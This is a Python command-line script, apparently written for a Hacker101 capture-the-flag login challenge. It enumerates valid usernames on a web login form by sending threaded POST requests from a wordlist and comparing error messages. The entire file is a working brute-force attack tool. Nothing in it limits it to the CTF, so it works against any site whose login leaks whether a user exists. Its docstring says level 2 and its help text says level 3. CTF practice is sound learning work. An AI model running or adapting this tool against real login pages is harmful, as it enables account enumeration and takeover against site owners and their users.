#!/usr/bin/env python3
# h101_login.py
import pathlib
import sys
from concurrent.futures import ThreadPoolExecutor, Future
from queue import Queue

import click
import requests


class H101Login:
    """
    This class is for brute forcing login at hacker101 CTF level 2.
    """

    def __init__(self, url: str, wordlist_file: pathlib.Path, max_threads: int, valid_string: str,
                 invalid_string: str) -> None:
        self.url: str = url
        self.wordlist_file: pathlib.Path = wordlist_file
        self.max_threads = max_threads
        self.valid_string = valid_string
        self.invalid_string = invalid_string.strip()
        self.session = requests.Session()
        self.data = {"username": "", "password": ""}
        self.word_queue = Queue()
        self.found_usernames = []
        self.futures = [Future]

    def _loop_words(self, seq_number, word):
        word = word.strip()
        if word != "":
            data = {"username": word, "password": "blah"}
            response = self.send_request(data)
            self.check_response(seq_number, word, response)

    def create_queue(self, wordlist):
        print("[+] Generating words queue...")
        for word in wordlist:
            self.word_queue.put(word)

    def loop_words(self, wordlist):
        self.create_queue(wordlist)
        print("[+] Queue successfully generated...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            seq_number = 1
            try:
                while not self.word_queue.empty():
                    future = executor.submit(self._loop_words, seq_number, self.word_queue.get())
                    self.futures.append(future)
                    seq_number += 1
            except KeyboardInterrupt:
                self.close()
                sys.exit("[-] Detected KeyboardInterrupt. Quitting...")

    def send_request(self, data) -> requests.Session.post:
        response = self.session.post(url=self.url, data=data)
        return response

    def check_response(self, seq_number, word, response):
        content = response.content.decode()
        if self.invalid_string not in content:
            if self.valid_string in content:
                print(f"\n[+] Found username: {word}")
                self.found_usernames.append(word)
                print(f"\tTotal found usernames ({len(self.found_usernames)}): {self.found_usernames}")
            else:
                print(f"\n[-] Unknown response: \n{content}", end="")
        else:
            print(f"\r[*] Attempted requests: {seq_number}", end="")
        # time.sleep(0.2)

    def start_words_loop(self):
        print("[+] Reading wordlist...")
        with open(self.wordlist_file, "r") as wl:
            self.loop_words(wl.readlines())

    def close(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for future in self.futures:
                if isinstance(future, Future):
                    if not future.cancelled():
                        future.cancel()
            executor.shutdown(wait=True)

    def run(self):
        try:
            self.start_words_loop()
        except KeyboardInterrupt:
            self.close()
            sys.exit("[-] Detected KeyboardInterrupt. Quitting...")


@click.command(
    help="""
        This app brute forces login at hacker101 CTF level 3.
        """
)
@click.option(
    "-u", "--url", "url",
    required=True,
    help="Type the target URL.",
    type=str,
)
@click.option(
    "-w", "--wordlist", "wordlist",
    required=True,
    help="Type the path to wordlist file.",
    type=pathlib.Path,
)
@click.option(
    "-m", "--mas_threads", "max_threads",
    help="Type the number of concurrent threads.",
    default=10,
    required=True,
    type=int,
)
@click.option(
    "-v", "--valid_string", "valid_string",
    help="Type successful login string.",
    prompt="Successful login string",
    default="Invalid password",
    required=True,
    type=str
)
@click.option(
    "-i", "--invalid_string", "invalid_string",
    help="Type unsuccessful login string.",
    prompt="Unsuccessful login string",
    default="Unknown user",
    required=True,
    type=str
)
def main(url, wordlist, max_threads, valid_string, invalid_string):
    login_bypass_robot = H101Login(url, wordlist, max_threads, valid_string, invalid_string)
    login_bypass_robot.run()


if __name__ == "__main__":
    main()
